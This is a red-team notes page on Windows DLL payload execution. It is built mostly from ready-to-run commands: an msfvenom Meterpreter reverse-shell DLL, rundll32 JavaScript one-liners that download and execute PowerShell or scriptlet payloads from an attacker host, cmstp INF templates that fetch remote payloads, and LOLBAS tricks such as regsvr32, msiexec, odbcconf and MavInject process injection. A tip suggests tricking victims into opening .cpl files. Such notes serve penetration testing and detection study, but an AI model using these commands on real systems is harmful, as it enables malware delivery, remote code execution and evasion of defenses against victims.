---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - T1085
  - T1191
  - windows
---
# DLL Execution

## 01 - Generate Payloads

### 1.1 - `msfvenom`

Generate a DLL payload then execute it with `StartW` entry point.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o payload.dll
```

### 1.2 - Empire

TODO: Fill this info

```
(Empire) > usestager windows/dll
```

## 02 - Execute Payload

> [!TIP] CPL Payloads
> You can actually social engineer the victim to double click the `.cpl` to establish connection.

### `rundll32.exe`

```
C:\> rundll32.exe payload.dll,StartW
```

To execute the **Control Panel Items** (`.cpl`) payload with entry point either `Control_RunDLL` or `Control_RunDLLAsuser`.

```
C:\> rundll32.exe shell32.dll,Control_RunDLL payload.cpl

C:\> rundll32.exe shell32.dll,Control_RunDLLAsuser payload.cpl
```

A custom payload can be compiled using the `.cpl` Windows features.

```
C:\> rundll32.exe payload.dll,Control_RunDLL
```

Execute a JavaScript that runs a PowerShell script that is downloaded from a remote web site.

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/payload.ps1')");
```

Execute a JavaScript that runs `calc.exe` and then kills the `rundll32.exe` process that was started.

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

Execute a scriptlet payload from a web server.

```
C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http[s]://<IP>[:PORT]/payload.sct")"
```

### `regasm.exe`

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
```

Loads the target .DLL file and executes the RegisterClass function.

```
C:\> regasm.exe AllTheThingsx64.dll
```

Loads the target .DLL file and executes the UnRegisterClass function.

```
C:\> regasm.exe /U AllTheThingsx64.dll
```

### `regsvcs.exe`

```
C:\> regsvcs.exe AllTheThingsx64.dll
```

### `regsvr32.exe`

Execute DLL payload.

```
C:\> regsvr32.exe /s payload.dll
```

### `msiexec.exe`

Execute the DLL payload  (calls `DLLRegisterServer`).

```
C:\> msiexec.exe /y "C:\path\to\payload.dll"
```

Unregisters the target DLL.

```
C:\> msiexec.exe /z "C:\path\to\payload.dll"
```

### `odbcconf.exe`

```
C:\> odbcconf.exe /a {regsvr.exe C:\path\to\payload.dll}
```

### `cmstp.exe`

Fileless scriptlet payload template

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/payload.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Yay"
ShortSvcName="Yay"
```

DLL dropper payload template.

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
C:\path\to\payload.dll
\\<IP>\payload.dll

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Pentestlab"
ShortSvcName="Pentestlab"
```

Execute payload.

```
C:\> cmstp.exe /ni /s payload.inf
```

Execute fileless payload.

```
C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/payload.inf
```

### `control.exe`

```
C:\> control.exe .\reflective_payload_loader.dll

C:\> control.exe .\reflective_payload_loader.cpl
```

### `pcalua.exe`

```
C:\> pcalua.exe -a .\payload.exe

C:\> pcalua.exe -a \\<attacker_IP>\<share_name>\payload.dll

C:\> pcalua.exe -a .\payload.cpl
```

### `MavInject.exe`

Inject DLL payload in a process ID.

```
C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\payload.dll
```

---
## References

### Backlinks

- [[DLL Injection]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/DotNET]]

- [[HTA]]

- [[Scriptlet]]

- [[Advpack]]

- [[Pcalua]]

### LOLBAS

- [LOLBAS: Regasm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)

- [LOLBAS: Regsvcs](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)

- [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)

- [LOLBAS: Odbcconf](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)

- [LOLBAS: Control](https://lolbas-project.github.io/lolbas/Binaries/Control/)

- [LOLBAS: Mavinject](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/)

- [LOLBAS: Setupapi](https://lolbas-project.github.io/lolbas/Libraries/Setupapi/)

- [LOLBAS: leadvpack](https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/)

- [LOLBAS: Certoc](https://lolbas-project.github.io/lolbas/Binaries/Certoc)

### Red Team Notes

- [Red Team Notes: Control Panel Item](https://www.ired.team/offensive-security/code-execution/t1196-control-panel-item-code-execution)

- [Red Team Notes: Forcing `iexplore.exe` to Load a Malicious DLL via COM Abuse](https://www.ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse)

### DMCXBlue

- [DMCXBlue: Rundll32](https://dmcxblue.gitbook.io/red-team-notes/execution/untitled)